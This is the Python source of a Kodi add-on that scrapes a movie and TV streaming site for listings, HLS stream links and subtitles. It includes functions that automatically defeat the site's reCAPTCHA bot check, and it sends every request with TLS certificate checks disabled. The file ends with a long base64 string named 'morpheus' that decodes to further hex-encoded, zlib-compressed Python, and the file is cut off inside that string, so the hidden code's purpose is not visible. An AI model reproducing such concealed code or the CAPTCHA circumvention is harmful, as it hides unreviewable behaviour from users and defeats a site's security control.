# -*- coding: UTF-8 -*-
from __future__ import division
import sys, re, os, io
import six
from six.moves import urllib_parse

import time
import ast
import requests
from requests.compat import urlparse

import xbmcgui
import xbmcplugin
import xbmcaddon
import xbmc, xbmcvfs

import inputstreamhelper

from resources.lib.brotlipython import brotlidec
import json

if six.PY3:
    basestring = str
    unicode = str
    xrange = range
    from resources.lib.cmf3 import parseDOM
else:
    from resources.lib.cmf2 import parseDOM

base_url = sys.argv[0]
addon_handle = int(sys.argv[1])
params = dict(urllib_parse.parse_qsl(sys.argv[2][1:]))
addon = xbmcaddon.Addon(id='plugin.video.lookmovietomb')

PATH            = addon.getAddonInfo('path')
if six.PY2:
    DATAPATH        = xbmc.translatePath(addon.getAddonInfo('profile')).decode('utf-8')
else:
    DATAPATH        = xbmcvfs.translatePath(addon.getAddonInfo('profile'))
if not os.path.exists(DATAPATH):
    xbmcvfs.mkdir(DATAPATH)

RESOURCES       = PATH+'/resources/'
FANART=RESOURCES+'../fanart.jpg'
ikona =RESOURCES+'../icon.png'

exlink = params.get('url', None)
nazwa= params.get('title', None)
rys = params.get('image', None)
try:
    infol = ast.literal_eval(urllib_parse.unquote_plus(params.get('infoLabels', None)))

except:
    infol = {}
page = params.get('page',[1])

UA =  'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0'
TIMEOUT=15
mainurl = "https://lookmovie.foundation" #"https://www.lookmovie2.to" #


proxyport = addon.getSetting('proxyport')
playt = addon.getSetting('play')
headers = {'User-Agent': UA}
sess = requests.Session()

fsortv = addon.getSetting('fsortV')
fsortn = addon.getSetting('fsortN') if fsortv else 'newest first'

fkatv = addon.getSetting('fkatV')
fkatn = addon.getSetting('fkatN') if fkatv else 'all'

frokv = addon.getSetting('frokV')
frokn = addon.getSetting('frokN') if frokv else 'all'

fratyv = addon.getSetting('fratyV')
fratyn = addon.getSetting('fratyN') if fratyv else 'all'

sratyv = addon.getSetting('sratyV')
sratyn = addon.getSetting('sratyN') if sratyv else 'all'

ssortv = addon.getSetting('ssortV')
ssortn = addon.getSetting('ssortN') if ssortv else 'newest first'

skatv = addon.getSetting('skatV')
skatn = addon.getSetting('skatN') if skatv else 'all'

srokv = addon.getSetting('srokV')
srokn = addon.getSetting('srokN') if srokv else 'all'

dataf =  addon.getSetting('fdata')  
datas =  addon.getSetting('sdata')



def build_url(query):
    return base_url + '?' + urllib_parse.urlencode(query)

def add_item(url, name, image, mode, itemcount=1, page=1,fanart=FANART, infoLabels=False,contextmenu=None,IsPlayable=False, folder=False):
    list_item = xbmcgui.ListItem(label=name)
    if IsPlayable:
        list_item.setProperty("IsPlayable", 'True')    
    if not infoLabels:
        infoLabels={'title': name}    
    list_item.setInfo(type="video", infoLabels=infoLabels)    
    list_item.setArt({'thumb': image, 'poster': image, 'banner': image, 'fanart': fanart})
    
    if contextmenu:
        out=contextmenu
        list_item.addContextMenuItems(out, replaceItems=True)

    xbmcplugin.addDirectoryItem(
        handle=addon_handle,
        url = build_url({'mode': mode, 'url' : url, 'page' : page, 'title':name,'image':image, 'infoLabels':urllib_parse.quote_plus(str(infoLabels))}),
        listitem=list_item,
        isFolder=folder)
    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%R, %Y, %P")

def home():

    add_item('movies', '[COLOR khaki][B]Movies[/COLOR][/B]', ikona, "listmenus",fanart=FANART, folder=True)
    add_item('series', '[COLOR khaki][B]TV Shows[/COLOR][/B]', ikona, "listmenus",fanart=FANART, folder=True)

def save_file(file, data, isJSON=False):
    with io.open(file, 'w', encoding="utf-8") as f:
        if isJSON == True:
            str_ = json.dumps(data,indent=4, sort_keys=True,separators=(',', ': '), ensure_ascii=False)
            f.write(str(str_))
        else:
            f.write(data)
    return
    
    
def load_file(file, isJSON=False):
    import collections
    if not os.path.isfile(file):
        return None
    
    with io.open(file, 'r', encoding='utf-8') as f:
        if isJSON == True:
            return json.load(f, object_pairs_hook=collections.OrderedDict)
        else:
            return f.read()
    
    
def CreateCookies():
    zz=''
    url = mainurl
    resp = sess.get(url, headers = headers, verify=False)
    cookies = (resp.cookies).get_dict()
    save_file(file=DATAPATH+'kukis', data=cookies, isJSON=True)
    return

try:
    kukis = load_file(DATAPATH+'kukis', isJSON=True)
    if not kukis or len(kukis) == 0:
        CreateCookies()
except:
    CreateCookies()
    # kukis = {}

def ListMenus(cd):
    # CreateCookies()
    if 'movies' in cd:
        add_item(mainurl+'/movies/page/1', '[B][COLOR gold] >>>> MOVIES <<<< [/COLOR][/B]', ikona, 'nic',fanart=FANART, folder=False, IsPlayable=False, infoLabels={'plot':'Movies'})
        add_item('f', 'Filters', ikona, 'listfilters',fanart=FANART, folder=True, IsPlayable=False, infoLabels={'plot':'Movies - categories'})

    
        add_item(mainurl+'/movies/page/1', 'Latest', ikona, 'listmovies',fanart=FANART, folder=True, IsPlayable=False, infoLabels={'plot':'Movies - latest'})
        add_item(mainurl+'/movies/', 'Categories', ikona, 'listcateg',fanart=FANART, folder=True, IsPlayable=False, infoLabels={'plot':'Movies - categories'})

        add_item(mainurl+'/movies/search/page/1?q=', 'Search', ikona, 'search',fanart=FANART, folder=False, IsPlayable=False, infoLabels={'plot':'Movies - search'})
    

    
    
    else:
        add_item(mainurl+'/movies/page/1', '[B][COLOR gold] >>>> TV SHOWS <<<< [/COLOR][/B]', ikona, 'nic',fanart=FANART, folder=False, IsPlayable=False, infoLabels={'plot':'TV shows'})
        add_item('s', 'Filters', ikona, 'listfilters',fanart=FANART, folder=True, IsPlayable=False, infoLabels={'plot':'Movies - categories'})

        
        
        add_item(mainurl+'/shows?page=1', 'Latest', ikona, 'listmovies',fanart=FANART, folder=True, IsPlayable=False, infoLabels={'plot':'TV shows - latest'})
        add_item(mainurl+'/shows', 'Categories', ikona, 'listcateg',fanart=FANART, folder=True, IsPlayable=False, infoLabels={'plot':'TV shows - categories'})
        add_item(mainurl+'/shows/search/page/1?q=', 'Search', ikona, 'search',fanart=FANART, folder=False, IsPlayable=False, infoLabels={'plot':'TV shows - search'})
    
        
    xbmcplugin.endOfDirectory(addon_handle) 
def ListFilters(url):
    rokn = srokn if 's' in url else frokn
    sortn = ssortn if 's' in url else fsortn
    katn = skatn if 's' in url else fkatn
    ratyn = sratyn if 's' in url else fratyn
    

    if 's' in url:
        add_item(mainurl+'/movies/page/1', '[B][COLOR gold] >>>> TV SHOWS <<<< [/COLOR][/B]', ikona, 'nic',fanart=FANART, folder=False, IsPlayable=False, infoLabels={'plot':'TV shows'})
        add_item(mainurl+'/shows/filter/page/1'+datas, '[B]List TV shows with filters:[/B]', ikona, 'listmovies',fanart=FANART, folder=True, IsPlayable=False, infoLabels={'plot':'Movies - latest'})

    else:
        add_item(mainurl+'/movies/page/1', '[B][COLOR gold] >>>> MOVIES <<<< [/COLOR][/B]', ikona, 'nic',fanart=FANART, folder=False, IsPlayable=False, infoLabels={'plot':'TV shows'})
        add_item(mainurl+'/page/1'+dataf, '[B]List movies with filters:[/B]', ikona, 'listmovies',fanart=FANART, folder=True, IsPlayable=False, infoLabels={'plot':'Movies - latest'})

    add_item('emp', "-  [COLOR lightblue]genre:[/COLOR] [B]"+katn+'[/B]', ikona, 'filtr:'+url+'kat',fanart=FANART, folder=False, IsPlayable=False, infoLabels={'plot':'Movies - search'})
    
    add_item('emp', "-  [COLOR lightblue]year:[/COLOR] [B]"+rokn+'[/B]', ikona, 'filtr:'+url+'rok',fanart=FANART, folder=False, IsPlayable=False, infoLabels={'plot':'Movies - search'})
    
    add_item('emp', "-  [COLOR lightblue]rating:[/COLOR] [B]"+ratyn+'[/B]', ikona, 'filtr:'+url+'raty',fanart=FANART, folder=False, IsPlayable=False, infoLabels={'plot':'Movies - search'})
    add_item('emp', "-  [COLOR lightblue]sorting:[/COLOR] [B]"+sortn+'[/B]', ikona, 'filtr:'+url+'sort',fanart=FANART, folder=False, IsPlayable=False, infoLabels={'plot':'Movies - search'})
    if 's' in url:
        add_item(mainurl+'/shows/search/page/1?q=', '[COLOR yellowgreen][B]Search TV SHOWS[/COLOR][/B]', ikona, 'search',fanart=FANART, folder=False, IsPlayable=False, infoLabels={'plot':'TV shows - search'})
    else:
        add_item(mainurl+'/movies/search/page/1?q=', '[COLOR yellowgreen][B]Search MOVIES[/COLOR][/B]', ikona, 'search',fanart=FANART, folder=False, IsPlayable=False, infoLabels={'plot':'Movies - search'})
    

    
    xbmcplugin.endOfDirectory(addon_handle) 

def ListCateg(url):
    html = sess.get(url, headers = headers, cookies=kukis, verify=False).text

    result = re.findall('>categories(.*?)<\/ul>',html,re.DOTALL+re.I)[0]
    
    for categ in parseDOM(result,'li'):
        href = parseDOM(categ,'a', ret="href")[0]
        href = mainurl + href if not href.startswith('http') else href
        title = parseDOM(categ,'a')[0]
        add_item(href+'/page/1', title, ikona, 'listmovies',fanart=FANART, folder=True, IsPlayable=False, infoLabels={'plot':title})

    xbmcplugin.endOfDirectory(addon_handle) 

def ListMovies(url, pg):

    if not '?q=' in url:
        if '.to/shows' in url or '.foundation/shows' in url:
            if '?g[]=' in url:
                pass
            else:
                if '?page=' in url:
                    url = re.sub('\?page\=\d+','?page=%d'%int(pg),url)
                else:
                    url = url + '?page=%d' %int(pg) 
        else:
        
            if '/page/' in url:
                url = re.sub('/page/\\d+','/page/%d'%int(pg),url)
            else:
                url = url + '/page/%d' %int(pg) 
    else:
        url = re.sub('\s+&\s+', ' ', url)
        if '/page/' in url:
            url = re.sub('/page/\\d+','/page/%d'%int(pg),url)
        else:
            url = url + '/page/%d' %int(pg) 
    np = '/page/%d?'%int(int(pg)+1)#?&g[]=
    #nextpage = unicode(int(pg)+1)
    html = sess.get(url, headers = headers, cookies=kukis, verify=False).text
    if '/shows?'  in url:
        ntpage = re.findall('li\s*class\s*=\s*"\s*next\s*"><a\s*href\s*=\s*"([^"]+)"', html,re.DOTALL+re.I)
    else:
        #if '?g[]=' in url and '/shows/' in url:
        #   ntpage = re.findall('li\s*class\s*=\s*"\s*next\s*"><a\s*href\s*=\s*"([^"]+)"', html,re.DOTALL+re.I)
        #else:
        ntpage = re.findall('pagination_next"\s*href\s*=\s*"([^"]+)"', html,re.DOTALL+re.I)
    
    ntpage = ntpage[0] if ntpage else ''
    ntpage = 'https:' + ntpage if ntpage.startswith('//') else ntpage

    ntpage = mainurl + ntpage if ntpage.startswith('/shows') else ntpage
    npage = True if ntpage != "" else False
    if '?g[]=' in url:
        npage = True if np in ntpage else False
    
    ids = [(a.start(), a.end()) for a in re.finditer('<div\s*class\s*=\s*"movie\-item', html)] 
    ids.append( (-1,-1) )
    l = 1
    ok = False
    for i in range(len(ids[:-1])):
        item = html[ ids[i][1]:ids[i+1][0] ]
        
        href = parseDOM(item,'a', ret="href")[0]
        
        
        href = mainurl+href if href.startswith('/') else href
        href = href.replace('/movies/view/', '/movies/play/')
        href = href.replace('/shows/view/', '/shows/play/')

        img = parseDOM(item,'img', ret="data-src")
        img = img[0] if img else ikona

        year = re.findall('year">([^<]+)<',item)
        year = year[0] if year else ''
        tit_tag = parseDOM(item,'h6')

        if '/shows?' in url or '/shows/' in url:
            title = tit_tag[0].replace('\n','').strip(' ')
            if 'href=' in title:
                title = parseDOM(title,'a')[0]
            info_data = parseDOM(item,'div', attrs={'class':"mv-item-infor" })
            if info_data:
                plot = parseDOM(info_data[0],'p')
                plot = plot[0] if plot else title
            else:
                plot = title
            mod = 'listserial' 
        else:
            
            title = parseDOM(tit_tag[0],'a')[0].replace('\n','').strip(' ')
            plot = title
            mod = 'listlinks' 
        
        ispla = False
        fold = True
        add_item(href, title, img, mod,fanart=FANART, folder=fold, IsPlayable=ispla, infoLabels={'plot':plot, 'year':year})
        ok = True
    if npage and len(ids[:-1]) > 19:
        add_item(ntpage, '>> next page >>' ,RESOURCES+'right.png', "listmovies",fanart=FANART, page=str(int(pg)+1), folder=True)
    if ok:
        xbmcplugin.endOfDirectory(addon_handle) 

def splitToSeasons(input, main_tit):
    out={}
    seasons = [x.get('season') for x in input]

    for s in set(seasons):

        out[main_tit+' - Season %02d'%s]=[input[i] for i, j in enumerate(seasons) if j == s]
    return out
    
def ListSerial(urlk,img):

    url2 = urlk.replace( '/shows/play/','/shows/view/')
    html = sess.get(url2, headers = headers, cookies=kukis, verify=False).text
    html = html.replace("\'",'"')
    plot = ''
    plot_data = parseDOM(html,'div', attrs={'class':"description-wrapper"} )
    if plot_data:
        plot = parseDOM(plot_data[0],'p')
        plot = plot[0] if plot else ''
    
    resp = sess.get(urlk, headers = headers, cookies=kukis, verify=False)#.text
    urlnew = resp.url
    html = resp.text

    html = html.replace('\\"',"'")
    html = html.replace("\'",'"')
    if '>Thread Defence' in html:
        html = resolveCaptcha(html,urlk, urlnew)
    dt = re.findall('show_storage"\]\s*=\s*({.*?};\\n\s+)',html,re.DOTALL)
    #if dt:
    if not dt:
        return
    dt = dt[0].replace('\\"',"'").replace('\n','').replace('   ', '')
    main_title = re.findall('title\:\s*"([^"]+)"',dt,re.DOTALL)[0]
    hash_ = re.findall('hash\:\s*"([^"]+)"',dt,re.DOTALL)[0]
    expire_ = re.findall('expires\:\s*(\d+)',dt,re.DOTALL)[0]

    seasons = re.findall('seasons\:\s*(\[.*?\])',dt,re.DOTALL)
    sezony = list( dict.fromkeys(re.findall('season\:\s*"(\d+)"',seasons[0],re.DOTALL)))
    out=[]
    for sez in sezony:
        for episode in re.findall('(\{.*?}),',seasons[0],re.DOTALL):
            print(episode)
            if re.findall('season\:\s*"(\d+)"',episode,re.DOTALL)[0] == sez:
                epis = re.findall('episode\:\s*"(\d+)"',episode,re.DOTALL)[0]
                id_epis = re.findall('id_episode\:\s*(\d+)',episode,re.DOTALL)[0]
                try:
                    title = ' (S%02dE%02d) - '%(int(sez),int(epis)) + re.findall('title\:\s*"([^"]+)"',episode,re.DOTALL)[0].replace("&#x27;", "'")
                except:
                    title = ' (S%02dE%02d)'%(int(sez),int(epis))
                # title = '[B][COLOR khaki]'+main_title+'[/COLOR] '+ title + ' (S%02dE%02d)[/B]'%(int(sez),int(epis))
                title = main_title + title
                plot = plot if plot != '' else title
                out.append({'title':title,'href':id_epis+'|'+hash_+'|'+str(expire_)+'|'+title, 'img':img, 'fnrt':FANART, 'plot':plot, 'season' : int(sez),'episode' : int(epis) })
    sezony =  splitToSeasons(out,main_title)
    
    for i in sorted(sezony.keys()):
        ac=urllib_parse.quote_plus(str(sezony[i]))

        add_item(ac, i, img, 'listepisodes',fanart=FANART, folder=True, IsPlayable=False, infoLabels={'plot':main_title})
    xbmcplugin.endOfDirectory(addon_handle, cacheToDisc=True)
    
def ListEpisodes(exlink):
    import ast

    episodes = ast.literal_eval(urllib_parse.unquote_plus(exlink))
    
    itemz=episodes
    items = len(episodes)
    
    for f in itemz:

        add_item(f.get('href'), f.get('title'), f.get('img'), 'listlinks',fanart=FANART, folder=True, IsPlayable=False, infoLabels={'plot':f.get('plot')})

    xbmcplugin.endOfDirectory(addon_handle) 

def girc(page_data, url, size='invisible'):

    """
    Code adapted from https://github.com/vb6rocod/utils/
    Copyright (C) 2019 vb6rocod
    and https://github.com/addon-lab/addon-lab_resolver_Project
    Copyright (C) 2021 ADDON-LAB, KAR10S
    """
    from requests.compat import urlparse
    import re, random, string
    domain = urlparse(url).netloc
    host = 'https://'+ domain
    import base64
    
    co = base64.b64encode((host + ':443').encode('utf-8')).decode('utf-8').replace('=', '')
    hdrs = {'Referer': url}
    rurl = 'https://www.google.com/recaptcha/api.js'
    aurl = 'https://www.google.com/recaptcha/api2'
    key = re.search(r"""(?:src="{0}\?.*?render|data-sitekey)=['"]?([^"']+)""".format(rurl), page_data)
    if key:
        key = key.group(1)
        # rurl = '{0}?render={1}'.format(rurl, key)

        page_data1 = requests.get(rurl, headers=hdrs).text
        v = re.findall('releases/([^/]+)', page_data1)[0]
        rdata = {'ar': 1,
                'k': key,
                'co': co,
                'hl': 'it',
                'v': v,
                'size': size,
                'sa': 'submit',
                'cb': ''.join([random.choice(string.ascii_lowercase + string.digits) for i in range(12)])}

        page_data2 = requests.get('{0}/anchor?{1}'.format(aurl, urllib_parse.urlencode(rdata)), headers=hdrs).text
        
        rtoken = re.search('recaptcha-token.+?="([^"]+)', page_data2)
        if rtoken:
            rtoken = rtoken.group(1)
        else:
            return ''
        pdata = {'v': v,
                'reason': 'q',
                'k': key,
                'c': rtoken,
                'sa': '',
                'co': co}
        hdrs.update({'Referer': aurl})  
        page_data3 = requests.post('{0}/reload?k={1}'.format(aurl, key), data=pdata, headers=hdrs).text
        gtoken = re.search('rresp","([^"]+)', page_data3)
        if gtoken:
            return gtoken.group(1)
    
    return ''

def resolveCaptcha(html, urlk, urlnew):
    # kukis2 = load_file(DATAPATH+'kukis', isJSON=True)
    token = girc(html,urlk)
    csr= re.findall('csrf\-token"\s*content="([^"]+)"',html,re.DOTALL) 
    if csr:
        csr = csr[0]
        
    
        headersx = {
            'Host': urlparse(mainurl).netloc,
            'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'pl,en-US;q=0.7,en;q=0.3',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': mainurl,
            'dnt': '1',
            'referer': urlnew, 
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
    
        }
    
        data = {
            '_csrf': csr,
            'tk': token,
        }
        
        resp = sess.post(urlnew, headers=headersx, data= data, cookies=kukis, verify=False)
        urlnew2 = resp.url
        html=resp.text  
        from resources.lib import recaptcha_v2
        
        sitek = re.findall('data\-sitekey\s*=\s*"([^"]+)"',html,re.DOTALL) [0]
    
        token = recaptcha_v2.UnCaptchaReCaptcha().processCaptcha(sitek, lang='en')
    
        csr= re.findall('csrf\-token"\s*content="([^"]+)"',html,re.DOTALL) 
        if csr:
            csr = csr[0]
            headersx = {
                'Host': urlparse(mainurl).netloc,
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'accept-language': 'pl,en-US;q=0.7,en;q=0.3',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': mainurl,
                'dnt': '1',
                'referer': urlnew, 
                'upgrade-insecure-requests': '1',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
    
            }
    
            data = {
                '_csrf': csr,
                'g-recaptcha-response': token,
                }
                
            resp = sess.post(urlnew2, headers=headersx, data= data, cookies=kukis, verify=False)
            urlnew2 = resp.url
            html=resp.text  
            if 'window.location.href' in html:
                cookies = (sess.cookies).get_dict()
                # save_file(file=DATAPATH+'kukis', data=cookies, isJSON=True)
                
                resp = sess.get(urlk, headers = headers, cookies=kukis, verify=False)#.text
    
                
                
                urlnew = resp.url
                html = (resp.text).replace("\'",'"')
    return html     
            
            
            
    
def ListLinks(urlk, ima = None):

    try:
        ac=json.loads(infol)
    except:
        pass
    
    if '|' in urlk:
        
        id_episode, hash_, expires_, title = urlk.split('|')
        plot = title
        try:
            plot = infol.get('plot', None)
        except:
            plot = title
        
        ac=''
        url = mainurl+'/api/v1/security/episode-access'
        year = ''
        params = {
            'id_episode': id_episode,
            'hash': hash_,
            'expires': expires_
        }
        urlk = mainurl+'/shows' 
    else:
        url2 = urlk.replace( '/movies/play/','/movies/view/')
        # kukis2 = load_file(DATAPATH+'kukis', isJSON=True)
        html = sess.get(url2, headers = headers, cookies=kukis, verify=False).text
        html = html.replace("\'",'"')

        plot = ''
        plot_data = parseDOM(html,'div', attrs={'class':"description-wrapper"} )
        if plot_data:
            plot = parseDOM(plot_data[0],'p')
            plot = plot[0] if plot else ''
        resp = sess.get(urlk, headers = headers, cookies=kukis, verify=False)#.text
        urlnew = resp.url
        html = (resp.text).replace("\'",'"')

        if '>Thread Defence' in html:
            html = resolveCaptcha(html,urlk, urlnew)

        dt = re.findall('movie_storage"\]\s*=\s*({.*?})',html,re.DOTALL)
        #if dt:
        if not dt:
            return
        title = re.findall('title\s*\:\s*"([^"]+)"',dt[0].replace('\\"', "'"),re.DOTALL)[0]
        plot = plot if plot !='' else title
        year = re.findall('year\s*\:\s*"([^"]+)"',dt[0],re.DOTALL)
        year = year[0] if year else ''
        hash_ = re.findall('hash\s*\:\s*"([^"]+)"',dt[0],re.DOTALL)[0]
        id_movie = re.findall('id_movie\s*\:\s*(\d+)',dt[0],re.DOTALL)[0]
        expires = re.findall('expires\s*\:\s*(\d+)',dt[0],re.DOTALL)[0]
        params = {
            'id_movie': str(id_movie),
            'hash': hash_,
            'expires': str(expires)}
            
        headers.update({'Referer': urlk, 'X-Requested-With': 'XMLHttpRequest'}) 
        
        url = mainurl+'/api/v1/security/movie-access'
    html = sess.get(url, headers = headers, cookies=kukis, params = params, verify=False).json()
    vid_source = list((html.get('streams', None)).values())[0]
    add_item(vid_source+'|'+urlk, title, ima, 'playvid',fanart=FANART, folder=False, IsPlayable=True, infoLabels={'plot':plot,'year':year})

    subtitles = html.get('subtitles', None)
    for subt in subtitles:
        lang = subt.get('language', None)
        if lang:
            if 'greek' in lang.lower():
                if isinstance(subt.get('file', None), basestring):

                    subt_url = mainurl+subt.get('file', None)

                    t2= title + ' [%s subs]'%(lang)
                    add_item(vid_source+'|'+urlk+'|nap='+subt_url, t2, ima, 'playvid',fanart=FANART, folder=False, IsPlayable=True, infoLabels={'plot':plot,'year':year})

    xbmcplugin.endOfDirectory(addon_handle, cacheToDisc=True)
    
def PlayVid(url, ima):
    if '|nap=' in url:
        vid_source, ref, subt = url.split('|')
        subt = subt.replace('nap=', '')
    else:
        vid_source, ref = url.split('|')
        subt = None
    is_helper = inputstreamhelper.Helper('hls')
    if is_helper.check_inputstream():
        play_item = xbmcgui.ListItem(path=vid_source)
    
        if sys.version_info >= (3,0,0):
            play_item.setProperty('inputstream', is_helper.inputstream_addon)
        else:
            play_item.setProperty('inputstreamaddon', is_helper.inputstream_addon)
    
    play_item.setProperty('inputstream.adaptive.manifest_type', 'hls')
    play_item.setMimeType('application/vnd.apple.mpegurl')
#   #   play_item.setMimeType('application/x-mpegurl')
#   ##  play_item.setProperty('inputstream.adaptive.manifest_headers', abcv)
    if subt:
        play_item.setSubtitles([subt])
    play_item.setContentLookup(False)
    xbmcplugin.setResolvedUrl(addon_handle, True, listitem=play_item)

    
def pla():

    if addon.getSetting('play') == 'default':
        return True
    else:
        return False

import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDY2NDYzMjUwMzY2YzcxNTMzNTY2NzU1NjM3NmUyYjM0NTU2YTJmNjM2MjZlNTY3MDM1NDEzODM0NjY1YTQ3NmQ1MjM5NmY2MzQ3MzM3MzYyNGU3MTUzNzg2NzYyNTI1NjRjMmI0MjQ0NmI2ZDQxNGQ0ZTcwNTU2YjMyNGMyYjJiMzE3NzcyNmU1MDU2MzM1NjMwN2E0ZjYxNjgzMTQ1NzA2OTJiNGY3Njc2NjU0ZTdhNTI2NTc5NDk3MTUwNzE2ZTMzMmY2MTU4MzQ3NjcwNmEyZjJiNGYzMzU4NjY3NjcyNGMyZjJmMzAzMjc5NTE0ZTY2NzYzMzZjMzEzMTJiNGY1NjU4MzIzOTY2NjY3OTMyMzIyZjM1NzQyZjMyMzM3NzZjMzkyZjM0NTI3NjQ3MzM1ODMzMmI3MDcyNzI2NjM2NjY1ODJmMmYzMjMyMmYyZjJmNzQ3Njc2NzU2ODMyNjY2NDM5NTgzODRkNzcyZjU3NzA1MTM2Njk2ZjUyNjQ2NjU0Mzk3MjUwNTYzODc1NDg0ZTY2NTg2OTc1NzQzNjM5NmE2YTJiNGM1MzMzN2E0OTcxNmI2ZDU4NzAzNTZiMzEyYjdhMzcyYjc0Njc3NjRmNTIyZjc5NjU2NDczMzc3OTZlNGM2ZTZkNjIyZjY5NzUzMzc1NDYzNTM1NzA3ODcyNjY1MDRmNzg2MzM2NTA0ODRlNmM2YTYyNTI2MTc0NDcyYjZlNzY2ODdhNGU1MDZjMmIzNzc3NzIzMzYyNmQzMzYzNzU2NTU2Nzc1NzJmNjg2ZDQzMzc3NTQ2NmMzNDMyNmU0NzM5Mzg1YTMzMzU2MTc0NjE1OTcyNmU1ODZiNTg1NjY2NGU0YjU3Mzc2YjU4NTczNzY5NDgzNzdhNGEyYjU5MzU2Yzc1MzE2MzM1NTA1MDc0MzU2NjY0NjY0ZDY3Mzc2ZTQyNzY2MTQ0NzE0ZTJiMzg1NjY3NmU3NjcxNGY1MzUxNzYzODRmMzc0Zjc5MzAzMjcxNDkzNzM1MzAzODdhNjM3NDM1NDc3NDc2NmQ0NjQxMmY2ZTY3NjM0NjMzNDI1ODM5NzQzNzRlNzY0ZTU0MzY1NTcyMzYzNjU0NjE3YTc2NDE0ZjMxNmU1NTU4NzE1NDdhNDg1MDUxNGYzNjZhNGE1NzY2NmY3NTRmMzg0MTZkNjU2ZTc3NzM1OTM2NjU0MTM2MzYzMDM5NGE2NTY1NGU0NTUyNjUzMTcyNmQ2YzQ2NjQ3YTdhMzE2ODdhNDQzMzc4NzQ2NjRlNDM0OTJiMzE1ODU3NWE2OTY2N2E3ODUwNzY1OTc2Mzg0Mzc2MzY3NjQzNzU0MzM5NzE3NDUwNDYzMTU3MzgyZjU0Njc1YTQyMzE2ZjRmNDc1ODM0NzI2NzQ0Mzk0YjM2Nzk1ODZlNzk0NTQ4NjY0YTYzMzkzNTc5NjY1NDM1NzE2MzRkNTA0Mzc0NzI0NDZlNzIzNjM5NTQ0YjJiNDQyZjZjNTE1ODZjNmE0YzRiNzgzNzdhNTk0MTU3MzY2YzY5NjU1MjQ2MmYzNjM3MzU3OTJiNzE3NzUwMmY1ODY2Njc2NjYyNmI0NTJmNjM0ZTM2NmQ0MjUwNDQ0YzQ5NDE1NDcxNmY1NjZmMzQzNTJmNTg2OTY2NGY3YTM3NTc3ODU0NzA2NDMyNjMzMDM3MzM0Zjc0NGIzODQ5NzYzMzc1Njc1MDc1NDM3ODJiNTE2ZjJmNmUzNjZlNzU3NDY5NzYzNDM3MzY0YjQ1NDI2NjM4NjM1NDM3Mzk3Mjc5NGM0MjJmNzg3NTM3NmU0NjUwMzY0MzU1MzE2NzMzNmQ1MTY0NTM0YTdhNTg2ZTc0Mzg2YTM3NTQ2YjJiNTAzNDQxMzI1NTQ2MmY1NzQzNTA3MjZjNzUyZjUxNDcyZjYyNGU2ZjRmMzg1Njc2MzY0ZDJiNDg0ZjdhNjY2NzY5MzQ0ODYzNjgzNTUzNmEyZjRkNGYzNjM2NTU3MjM3NDE0ZjM1NjU0YzY4NGY1NjM5Njc1MDY1NmEzNjc0NDg2ZTRkNzY2NDcyNTA1NTU1NGIzNzUxMzQzNzQ5Nzk2YzU4NjI0MjRhMmI3YTQ0NTU0MzM2NTE3MzM0NTk0ZDU0NTk3NjM3NmM3NTQ4MzYzMjQxMmYzNjRiNmQ0NjUwNzQ0Mzc2Nzk0MzMzNzU0MjQ4Njk0MzZlNGM0MzMxNDE2ODM4NDU3NjM1NDU0YTM2NTA0Yjc4NTI2NzYxNjY1NDM4Njc3NzY0MzI0ODZhNTA0MjUzMzA0ZjM3NDc3MDQxNTA2OTQ0NDg0NjZhNjE0YTYyMzI0NTUwNTk2ZDM4NDc2MzY4NTEzNTUwMzc2ZTY1NmU1MDVhNzk3NzZlMzc2NDM4Njc2YTM3Njc0MjMxNzczMzYyNGI1NjM5MzY3MTczMzEzMzMzNmU1NzM5NTE1ODMzNzM2NjdhNmE1MDM1NDE2NTY4Nzk3ODU0NTczOTM1NmY2YTMzNDI1MDZkNDU1MDVhNTcyYjY2NDczNTJmMzIzMDRlNzM0NjM3NjM0ODU0NjU0MjM3NmE2NjU4N2E0YzM5NTY0YjJiNzgyZjU2NzA2NDM2NDQ2Mjc5MzM0MzM5NjY2NzYzNjQzNDQ0NTc0NDU4NmE1NDcwNjU3MzM1Mzc2NTVhMzIzNTQ4MmY2MTQyNmUyZjZjNGY1NDc0NmQ2NTQ0NzY2OTRjNTg2NjQ1NzI3OTQxNTAyYjUxMzc2ZTQxMzc2YjczNGMzNjc3MzU0Njc2NzY0MTMzNzk0MjUyMzI0NDM3MmY0MTZlNzY2YzcwNGE2NjYxMzQ2ZjQ0MzI2NTUzNzU2ZjU2NjM2OTM4NzA0ODM4NmY0YTY0NmIzMDVhNjc1MzJmNzg0MjJmNjk1NDUyMzc3NTQ3MmYzNTJmNDE2ZjJmNjc3MjcyNjc1MDc3NmI1MDVhNzk3OTQ4Njg2NDcyNTQ3MjczNDEzMzcwNjg0MjM4NTM0Njc5NzI2NDM2NzY2NjcxNjc2ZjM2NDE2NDQzMzkyZjMwNjUyZjY3NTg2MjU5MmYzMjQ5NDQ2NzQyNzU3OTQ1NmQ2NzQ4MmY2ZjRlNTY1ODU5NDgzMzRiNzY2MTQxNjQzNDU0NmEyZjc0Mzg2YTUwNzM0NTMzMzU0Yjc2NTI2NTMwNmIzNTRjNjY3YTM3NmI1MDU1NDk3NjMyNmE1MDc2NTE0ZDJmNDM2YjRmMzE2NzRjMzg2MzM4NTkzOTQ3NDE2NDc5NDM2OTQ0NzY2MzM3NDYzMzMyNjc3NjM5NDYyZjM2Njk3NzM4NjI3MDQyMzk2ZDMyNGEzOTMyNTQ3NjM2N